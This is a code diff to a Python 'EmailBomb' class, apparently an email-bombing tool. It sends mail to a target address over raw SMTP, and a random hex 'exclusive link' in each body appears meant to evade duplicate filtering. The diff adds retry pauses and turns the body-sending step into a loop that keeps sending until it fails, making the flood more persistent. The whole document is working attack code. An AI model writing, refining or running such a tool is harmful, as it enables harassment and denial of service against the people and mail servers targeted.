@@ -68,7 +68,10 @@ class EmailBomb:
                     code, msg = self.emailer.Send(u"ehlo antispam")
                     self.update_status(msg, code=code)
                     if not code:
+                        time.sleep(2)
                         continue
+                else:
+                    time.sleep(2)
 
                 time.sleep(random.random())
                 # 表明发件地址
@@ -76,6 +79,7 @@ class EmailBomb:
                 code, msg = self.emailer.Send(u"mail from:<%s>" % self.from_addr)
                 self.update_status(msg, code=code)
                 if not code:
+                    time.sleep(2)
                     continue
 
                 time.sleep(random.random())
@@ -85,6 +89,8 @@ class EmailBomb:
                 self.update_status(msg, code=code)
                 if code:
                     break
+                else:
+                    time.sleep(2)
 
             while not self.exit_flag:
                 # 信件具体内容
@@ -93,6 +99,8 @@ class EmailBomb:
                 self.update_status(msg, code=code)
                 if code:
                     break
+                else:
+                    time.sleep(2)
 
             while not self.exit_flag:
                 # to:
@@ -100,6 +108,7 @@ class EmailBomb:
                 code, msg = self.emailer.Send(u"to: %s" % self.to_addr, recv=False)
                 self.update_status(msg, code=code)
                 if not code:
+                    time.sleep(2)
                     continue
 
                 # from:
@@ -107,6 +116,7 @@ class EmailBomb:
                 code, msg = self.emailer.Send(u"from: %s" % self.from_addr, recv=False)
                 self.update_status(msg, code=code)
                 if not code:
+                    time.sleep(2)
                     continue
 
                 # subject:
@@ -114,23 +124,27 @@ class EmailBomb:
                 code, msg = self.emailer.Send("subject: "+subject+"\r\n", recv=False)
                 self.update_status(msg, code=code)
                 if not code:
+                    time.sleep(2)
                     continue
 
                 break  # 上面都发送成功的话，就 break
 
-            # body:
-            self.update_status("=> send body")
-            code, msg = self.emailer.Send(
-                content+u"\r\n\r\n你的专属链接为："+"".join(
-                    random.choice(string.hexdigits)
-                    for i in range(32)
-                )+"\r\n.\r\n",  # 随机化部分邮件内容
+            while not self.exit_flag:
+                # body:
+                self.update_status("=> send body")
+                code, msg = self.emailer.Send(
+                    content+u"\r\n\r\n你的专属链接为："+"".join(
+                        random.choice(string.hexdigits)
+                        for i in range(32)
+                    )+"\r\n.\r\n",  # 随机化部分邮件内容
 
-                check="250"  # 状态码为 250 说明发送成功
-            )
+                    check="250"  # 状态码为 250 说明发送成功
+                )
 
-            self.update_status(msg, code=code)
+                self.update_status(msg, code=code)
+                time.sleep(2)
 
-            time.sleep(random.random()*1.5)
+                if not code:
+                    break
 
         self.running = 0
